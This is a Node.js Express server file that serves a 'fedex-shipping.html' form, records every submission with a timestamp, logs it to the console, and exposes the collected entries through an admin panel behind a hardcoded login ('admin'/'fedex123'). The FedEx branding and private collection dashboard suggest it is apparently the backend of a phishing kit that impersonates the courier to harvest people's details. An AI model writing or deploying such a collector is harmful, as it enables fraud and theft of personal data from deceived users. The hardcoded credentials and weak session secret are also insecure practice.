import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import session from "express-session";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.use(
  session({
    secret: "fedex_secret_key", // change this to something stronger
    resave: false,
    saveUninitialized: false,
  })
);

// Store submissions
const submissions = [];

// Default route (user form)
app.get("/", (_, res) => {
  res.sendFile(path.join(__dirname, "fedex-shipping.html"));
});

// Handle form submission
app.post("/submit", (req, res) => {
  const data = req.body;
  const timestamp = new Date().toLocaleString();

  // Add timestamp to help track multiple entries
  submissions.push({ ...data, timestamp });

  console.log(`📝 New submission from ${data.name}:`, data);
  res.json({ status: "ok" });
});

// Login page
app.get("/login", (_, res) => {
  res.sendFile(path.join(__dirname, "login.html"));
});

// Handle login
app.post("/login", (req, res) => {
  const { username, password } = req.body;

  if (username === "admin" && password === "fedex123") {
    req.session.loggedIn = true;
    return res.redirect("/submissions");
  }

  res.send("<h3>Invalid login. <a href='/login'>Try again</a></h3>");
});

// Protected submissions page
app.get("/submissions", (req, res) => {
  if (!req.session.loggedIn) return res.redirect("/login");
  res.sendFile(path.join(__dirname, "submissions.html"));
});

// Data API
app.get("/data", (req, res) => {
  if (!req.session.loggedIn) return res.status(401).json({ error: "Unauthorized" });
  res.json(submissions);
});

// Logout
app.get("/logout", (req, res) => {
  req.session.destroy(() => res.redirect("/login"));
});

// Start server
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`🌐 User form:  http://localhost:${PORT}`);
  console.log(`🔐 Admin login: http://localhost:${PORT}/login`);
});
